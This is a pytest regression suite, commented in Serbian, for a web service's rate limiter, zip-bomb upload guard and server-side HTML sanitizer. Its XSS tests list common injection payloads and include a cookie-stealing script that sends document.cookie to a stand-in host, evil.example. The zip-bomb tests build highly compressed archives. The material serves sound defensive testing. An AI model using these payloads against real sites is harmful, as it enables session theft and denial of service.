# -*- coding: utf-8 -*-
"""
P1/P2 security sprint — regresioni testovi.

a) Rate limiter — potvrđuje da paralelni zahtevi preko limita dobijaju 429
   (protiv TRENUTNOG in-memory limitera — Redis-backed varijanta je
   eksplicitno OSTAVLJENA OTVORENOM u ovom sprintu, videti
   docs/security/P1_P2_FIX_VERIFICATION.md; ovaj test ostaje validan bez
   izmene kad/ako se storage backend promeni, jer testira ponašanje
   Limiter-a, ne koji storage koristi).
b) Zip-bomb / decompression-bomb guard (SEC-007) — uploaded_doc/extractor.py.
c) XSS server-side sanitizacija (SEC-008) — security/html_sanitize.py i
   routers/portal_monitoring.py integracija.
"""
import io
import os
import zipfile

import pytest
from starlette.requests import Request

os.environ.setdefault("SUPABASE_URL", "https://fake.supabase.co")
os.environ.setdefault("SUPABASE_ANON_KEY", "fake-anon-key")
os.environ.setdefault("SUPABASE_SERVICE_KEY", "fake-service-key")
os.environ.setdefault("SUPABASE_JWT_SECRET", "fake-jwt-secret-longer-than-32-chars-ok")
os.environ.setdefault("OPENAI_API_KEY", "sk-fake")
os.environ.setdefault("PINECONE_API_KEY", "fake-pinecone")
os.environ.setdefault("PINECONE_HOST", "https://fake.pinecone.io")

from api import app  # noqa: E402  (bootstraps shared/rate.py's limiter too)
from shared.rate import limiter  # noqa: E402


# ═══════════════════════════════════════════════════════════════════════════
# (a) Rate limiter — 429 on limit exceeded
# ═══════════════════════════════════════════════════════════════════════════

def _make_request(client_ip: str) -> Request:
    """Real starlette Request — @limiter.limit does an isinstance check,
    a bare MagicMock fails it (established pattern, see
    tests/test_sec001_predmet_ownership.py-style rate-limited tests)."""
    scope = {
        "type": "http",
        "method": "GET",
        "path": "/test-rate-limit",
        "headers": [(b"x-forwarded-for", client_ip.encode())],
        "client": (client_ip, 12345),
        "query_string": b"",
    }
    return Request(scope)


class TestRateLimiterReturns429:
    """Testira PONAŠANJE limitera (prekoračenje → 429), nezavisno od toga
    da li je storage in-memory ili Redis-backed — ugovor koji mora ostati
    tačan bez obzira na buduću odluku o storage backend-u."""

    def test_exceeding_limit_returns_429(self):
        from slowapi.errors import RateLimitExceeded

        test_limiter_key = "test-sec-p1-a-strict"

        @limiter.limit("3/minute", key_func=lambda request: test_limiter_key)
        async def _dummy_endpoint(request: Request):
            return {"ok": True}

        import asyncio
        allowed = 0
        blocked = 0
        for _ in range(6):
            # Fresh Request per call — a real HTTP request never reuses one,
            # and slowapi caches its verdict on request.state after the
            # first check (_rate_limiting_complete), so reusing the same
            # object here would only ever check the limit once.
            req = _make_request("203.0.113.10")
            try:
                asyncio.run(_dummy_endpoint(request=req))
                allowed += 1
            except RateLimitExceeded:
                blocked += 1

        assert allowed == 3, f"Expected exactly 3 allowed calls (the limit), got {allowed}"
        assert blocked == 3, f"Expected the remaining 3 calls blocked with 429, got {blocked}"

    def test_different_keys_have_independent_limits(self):
        """Potvrđuje da limit nije globalan po procesu — svaki key (IP) ima
        sopstveni brojač, bitno svojstvo bez obzira na storage backend."""
        from slowapi.errors import RateLimitExceeded

        # Distinct function name from the other test in this class — slowapi
        # keys its internal route-limit registry by f"{module}.{func.__name__}",
        # so two same-named local functions across tests would share a limit
        # registration and interfere with each other's counters.
        @limiter.limit("1/minute", key_func=lambda request: request.headers.get("x-forwarded-for"))
        async def _dummy_endpoint_independent_keys(request: Request):
            return {"ok": True}

        import asyncio
        asyncio.run(_dummy_endpoint_independent_keys(request=_make_request("203.0.113.20")))  # consumes A's only slot
        with pytest.raises(RateLimitExceeded):
            asyncio.run(_dummy_endpoint_independent_keys(request=_make_request("203.0.113.20")))  # fresh Request, same IP
        # B has its own independent slot (different IP/key), unaffected by A's limit
        asyncio.run(_dummy_endpoint_independent_keys(request=_make_request("203.0.113.21")))


# ═══════════════════════════════════════════════════════════════════════════
# (b) Zip-bomb / decompression-bomb guard (SEC-007)
# ═══════════════════════════════════════════════════════════════════════════

from uploaded_doc.extractor import (  # noqa: E402
    DocumentSafetyLimitExceeded,
    MAX_DECOMPRESSED_BYTES,
    MAX_PDF_PAGES,
    _check_docx_zip_safety,
    extract_docx,
)


def _write_zip(tmp_path, entries: dict[str, bytes]) -> "object":
    p = tmp_path / "test.docx"
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return p


class TestZipBombGuard:
    def test_high_ratio_entry_rejected(self, tmp_path):
        """Realan zip-bomb obrazac: mala datoteka na disku, ekstremna kompresija
        (ponovljeni karakter — isto što i pravi zip-bomb payload-i rade)."""
        payload = b"A" * (30 * 1024 * 1024)  # 30MB of one repeated byte
        p = _write_zip(tmp_path, {"word/document.xml": payload})
        on_disk_size = p.stat().st_size
        assert on_disk_size < 100 * 1024, "test fixture pretpostavka: kompresovano treba biti sitno"

        with pytest.raises(DocumentSafetyLimitExceeded) as exc_info:
            _check_docx_zip_safety(p)
        assert "ratio" in exc_info.value.reason

    def test_oversized_total_decompressed_rejected(self, tmp_path):
        """Više umerenih po-ratio-u ulaza koji zajedno pređu apsolutni limit."""
        # ~120 KB kompresovano po ulazu (nizak entropijski sadržaj ali ne ekstremna
        # kompresija), ukupno declared decompressed > MAX_DECOMPRESSED_BYTES.
        import os as _os
        entries = {}
        chunk = bytes((i % 251) for i in range(2 * 1024 * 1024))  # 2MB pseudo-random-ish per entry
        n_entries = (MAX_DECOMPRESSED_BYTES // len(chunk)) + 5
        for i in range(n_entries):
            entries[f"part_{i}.bin"] = chunk
        p = _write_zip(tmp_path, entries)

        with pytest.raises(DocumentSafetyLimitExceeded) as exc_info:
            _check_docx_zip_safety(p)
        assert "decompressed size" in exc_info.value.reason or "ratio" in exc_info.value.reason

    def test_legitimate_small_docx_not_rejected(self, tmp_path):
        """Negative test — normalan mali DOCX-oblik sadržaj NE sme biti odbijen
        (sprečava lažno pozitivan rezultat za realne pravne dokumente)."""
        legit_xml = (
            "<w:document>" + ("<w:p><w:r><w:t>Ugovor o zakupu, član 1.</w:t></w:r></w:p>" * 50) + "</w:document>"
        ).encode("utf-8")
        p = _write_zip(tmp_path, {"word/document.xml": legit_xml, "[Content_Types].xml": b"<Types/>"})
        _check_docx_zip_safety(p)  # ne sme baciti

    def test_extract_docx_never_decompresses_a_rejected_bomb(self, tmp_path):
        """Integracioni test: extract_docx() mora odbiti PRE poziva python-docx-a
        (ne posle pokušaja da se dokument otvori i eventualno padne na drugi
        način) — dokazuje da je provera zaista prva stvar koja se desi."""
        payload = b"B" * (40 * 1024 * 1024)
        p = _write_zip(tmp_path, {"word/document.xml": payload})
        with pytest.raises(DocumentSafetyLimitExceeded):
            extract_docx(p)

    def test_pdf_page_count_cap_enforced(self, monkeypatch):
        """MAX_PDF_PAGES konstanta postoji i extract_pdf poštuje je — testirano
        kroz direktan poziv sa mock-ovanim pypdf.PdfReader (bez potrebe za
        pravim 500+ stranica PDF fajlom)."""
        import uploaded_doc.extractor as extractor_module

        class _FakePage:
            def extract_text(self):
                return "x"

        class _FakeReader:
            def __init__(self, *a, **kw):
                self.pages = [_FakePage() for _ in range(MAX_PDF_PAGES + 1)]

        import sys
        import types
        fake_pypdf = types.ModuleType("pypdf")
        fake_pypdf.PdfReader = _FakeReader
        monkeypatch.setitem(sys.modules, "pypdf", fake_pypdf)

        with pytest.raises(DocumentSafetyLimitExceeded) as exc_info:
            extractor_module.extract_pdf(__import__("pathlib").Path("fake.pdf"))
        assert "PDF pages" in exc_info.value.reason


# ═══════════════════════════════════════════════════════════════════════════
# (c) XSS server-side sanitizacija (SEC-008)
# ═══════════════════════════════════════════════════════════════════════════

from security.html_sanitize import sanitize_text  # noqa: E402

_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "<a href=\"javascript:alert(1)\">klik</a>",
    "<iframe src=\"//evil.example\"></iframe>",
    "normalan status <b onmouseover=alert(1)>predmeta</b>",
]


class TestHtmlSanitization:
    @pytest.mark.parametrize("payload", _XSS_PAYLOADS)
    def test_dangerous_tags_and_attributes_stripped(self, payload):
        cleaned = sanitize_text(payload)
        assert "<script" not in cleaned.lower()
        assert "<img" not in cleaned.lower()
        assert "<svg" not in cleaned.lower()
        assert "<iframe" not in cleaned.lower()
        assert "onerror=" not in cleaned.lower()
        assert "onload=" not in cleaned.lower()
        assert "onmouseover=" not in cleaned.lower()

    def test_none_passes_through_unchanged(self):
        """last_error se namerno postavlja na None kad je provera uspešna —
        sanitize_text ne sme pretvoriti to u prazan string."""
        assert sanitize_text(None) is None

    def test_plain_legal_status_text_unaffected(self):
        normal = "U toku - zakazano ročište za 15.03.2027"
        assert sanitize_text(normal) == normal

    def test_overlong_value_truncated(self):
        huge = "x" * 5000
        result = sanitize_text(huge, max_len=2000)
        assert len(result) == 2000

    def test_portal_status_update_sanitizes_last_error(self):
        """Integracioni test na tačnom mestu originalnog SEC-008 nalaza —
        last_error polje u praceni_predmeti update-u."""
        from routers.portal_monitoring import _current_status_update

        malicious_result = {
            "kind": "error",
            "greska": "<script>document.location='//evil.example/steal?c='+document.cookie</script>",
        }
        update = _current_status_update(malicious_result, promena=False)
        assert "<script" not in (update["last_error"] or "").lower()

    def test_portal_status_field_sanitized_in_scrape_result(self):
        """_extrahuj_status() ekstrahuje iz spoljašnjeg HTML-a preko regex-a
        koji strukturno ne može uhvatiti '<' karakter (sam obrazac zahteva
        [^<]) — ovaj test dokazuje da je sanitizacija PRIMENJENA na tom mestu
        u kodu (odbrana u dubinu), ne da regex ne bi već sprečio '<script>'."""
        import inspect

        from routers.portal_monitoring import _scrape_portal_status
        src = inspect.getsource(_scrape_portal_status)
        assert "_sanitize_text(status)" in src, (
            "_scrape_portal_status mora sanitizovati 'status' pre vraćanja — "
            "vidi SEC-008 u SECURITY_GAP_REGISTER.md"
        )
